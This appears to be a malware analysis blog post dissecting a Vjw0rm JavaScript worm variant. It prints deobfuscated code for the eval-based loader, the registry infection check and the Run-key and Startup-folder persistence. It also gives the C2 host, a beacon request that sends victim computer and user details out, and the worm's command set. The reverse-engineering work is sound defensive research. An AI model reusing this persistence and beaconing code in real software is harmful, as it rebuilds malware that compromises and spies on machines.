# Mr. Robot Variant of Vjw0rm


I was monitoring `Any.Run` when a `.js` file peeked my interest due to the limited network traffic.

# Analysis

`Metadata:`
- Name: `1.js`
- MD5 : `3f438e857c45a4812dbfa331fd3b8011`

The first stage decrypts a long Unicode string then calls `eval` on its result as seen in _Figure 1_.

```js
function y(o,h) {
    var t;var s="";
    var d=(o+"").split("");
    for (var i=0;i<d.length;i++){
        t=d[i].charCodeAt(0);
        s+=String.fromCharCode(256-+t+(+h));
    }
    return s;
}
WScript.Sleep(10000);
eval("eval(y(\"<long_unicode_string>\"");
```
_Figure 1: Deobfuscation routine_

When threat actor(s) use `eval`, most of the time I can easily bypass this with replacing it with `console.log` and using `nodejs` to do the heavy lifting for us.

In our case here this is exactily what I did with removing the sleep and replacing `eval` with `console.log`.

After the script is run with modifications it is possible to obtain the pseudo deobfuscated code.

This means that the contents are still obfuscated to make it difficult for reading however we can identify some key functionality.

In this case most of the strings are stored in an array with the variable `_0x4ba2`.

This will have to be deobfuscated by hand as seen in _Figure 2_.

```js
try {
	U = sh[_0xb4af('0xd')](g[2]);
} catch (_0x55fd01) {
	var sv = fu[_0xb4af('0xe')]('\\');
	if (':\\' + sv[1] == ':\\' + wn) {
		U = _0xb4af('0xf');
		sh['RegWrite'](g[2], U, g[5]);
	} else {
		U = _0xb4af('0x10');
		sh[_0xb4af('0x11')](g[2], U, g[5]);
	}
}
Ns();
```
_Figure 2: Obfuscated result_

To achieve this I renamed the variable and simplified the code so its easily human readable.

`Vjw0rm` will first check for the registry key `HKCU\\vjw0rm` if the value is `TRUE` or `FALSE` to determine if the machine is already infected or not and will then run the `Install()` routine as seen in _Figure 3_.

```js
try{
	is_installed = sh['RegRead']('HKCU\\vjw0rm');
} catch(_0x55fd01){
	var sv = fu['split']('\x5c');
	if(':\x5c' + sv[0x1] == ':\x5c' + script_name){
		is_installed = 'TRUE';
		sh['RegWrite']('HKCU\\vjw0rm', is_installed, 'REG_SZ');
	} else{
		is_installed = 'FALSE';
		sh['RegWrite']('HKCU\\vjw0rm', is_installed, 'REG_SZ');
	}
}
Install();
```
_Figure 3: Check if installed_

The install routine will copy the script to the `%TEMP%` directory then establish persistence by setting the registry key `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WEW2BF0U0A` with the value being the path to `vjw0rm` as seen in _Figure 4_.

```js
function Install(){
	var worm_file = GetEnv('TEMP') + char_backslash + script_name;
	try{
		fs['CopyFile'](fu, worm_file, !![]);
	} catch(_0x349bb9){}
	try{
		sh['RegWrite']('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WEW2BF0U0A', '\x22' + worm_file + '\x22', 'REG_SZ');
	}catch(_0x58ded7){}
	try{
		var shell_app = GetActiveXObject(ACTIVEX_OBJECT_SHELL_APPLICATION);
		fs['CopyFile'](fu, shell_app['NameSpace'](0x7)['Self']['Path'] + '\x5c' + script_name, !![]);
	}catch(_0x151660){}
}
```
_Figure 4: Vjw0rm Persistence / Installation_

After installation has completed it will send a HTTP POST request to the C2 server `updatefacebook.ddns.net:6`.

Information of the victim machiine will be supplied to the C2 server by providing it in the `User-Agent` header.

The traffic will look like the following:

```http
POST /Vre HTTP/1.1
Host: updatefacebook.ddns.net:6
User-Agent: MR_ROBOT_18d0-EEF8\COMPUTER-NAME\USERNAME\caption\FullName\\TRUE\TRUE\
```

The `User-Agent` contains the campaign prefix, drive id, computer-name, username, caption, full name, TRUE/FALSE (if visual basic compiler present), TRUE/FALSE (if Vjw0rm is installed).

This variant has several command options, `Sc` (write file to disk and run it), `Ex` (run additional JSCript code), `Rn` (rename the UUID), `Up` (Run code w/ WScript), and `RF` (run file).

Analysis files for this sample can be downloaded [here](/samples/2020-02-01-vjw0rm.zip).

The password to all ZIP archives on this site is `infected`.

Thank you,

# References
- [Any.Run](https://app.any.run/tasks/8953f3c1-6058-46ec-b3f4-03b46d3c39f9/)
- [VirusTotal](https://www.virustotal.com/gui/file/ea59411c081c6fa100b6d57f1dfa06221834dd22243272e8fd450e89655b0d49/detection)

